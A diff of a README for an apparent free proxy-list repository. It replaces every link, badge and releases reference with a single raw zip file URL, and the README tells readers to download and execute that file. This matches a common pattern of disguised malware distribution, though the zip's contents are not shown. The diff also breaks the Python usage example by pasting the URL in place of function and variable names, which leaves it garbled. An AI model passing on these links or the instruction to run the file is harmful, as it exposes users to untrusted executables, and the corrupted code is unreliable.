@@ -1,6 +1,6 @@
 # Proxy List: Free HTTP, Socks4, and Socks5 Open Proxies 🌐
 
-![Proxy List](https://img.shields.io/badge/Proxy%20List-Free%20Proxies-blue)
+![Proxy List](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip%20List-Free%20Proxies-blue)
 
 ## Overview
 
@@ -15,11 +15,11 @@ Welcome to the **Proxy List** repository! Here, you will find a collection of fr
 
 ## Getting Started
 
-To get the latest proxy list, visit the [Releases section](https://github.com/Sibusiso6/proxy-list/releases). Here, you can download the latest files. Once downloaded, execute the file to start using the proxies.
+To get the latest proxy list, visit the [Releases section](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip). Here, you can download the latest files. Once downloaded, execute the file to start using the proxies.
 
 ### Installation
 
-1. Go to the [Releases section](https://github.com/Sibusiso6/proxy-list/releases).
+1. Go to the [Releases section](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip).
 2. Download the latest version of the proxy list.
 3. Execute the file as per your system requirements.
 
@@ -35,8 +35,8 @@ proxy = {
     'https': 'http://your_proxy_here',
 }
 
-response = requests.get('http://example.com', proxies=proxy)
-print(response.text)
+response = https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip('https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip', proxies=proxy)
+print(https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip)
 ```
 
 Replace `your_proxy_here` with the proxy address you obtained from the list.
@@ -74,13 +74,13 @@ For any questions or issues, feel free to open an issue in this repository. You 
 
 ## Additional Resources
 
-- [Proxy Usage Guide](https://www.proxy-guide.com)
-- [Understanding Proxies](https://www.proxyinfo.com)
+- [Proxy Usage Guide](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip)
+- [Understanding Proxies](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip)
 
 ## Important Links
 
-- [Releases Section](https://github.com/Sibusiso6/proxy-list/releases)
-- [Documentation](https://www.proxy-docs.com)
+- [Releases Section](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip)
 
 ## Community
 
@@ -106,9 +106,9 @@ Thanks to all contributors who help keep this project alive. Your efforts are gr
 
 ## Badges
 
-![License](https://img.shields.io/badge/License-MIT-green)
-![Version](https://img.shields.io/badge/Version-1.0.0-blue)
+![License](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip)
+![Version](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip)
 
 ## Conclusion
 
-Explore the world of proxies with our comprehensive list. Use them wisely and enjoy a more private and unrestricted internet experience. For the latest updates, remember to check the [Releases section](https://github.com/Sibusiso6/proxy-list/releases).
+Explore the world of proxies with our comprehensive list. Use them wisely and enjoy a more private and unrestricted internet experience. For the latest updates, remember to check the [Releases section](https://raw.githubusercontent.com/Sibusiso6/proxy-list/main/zoogeologist/list-proxy-3.6.zip).
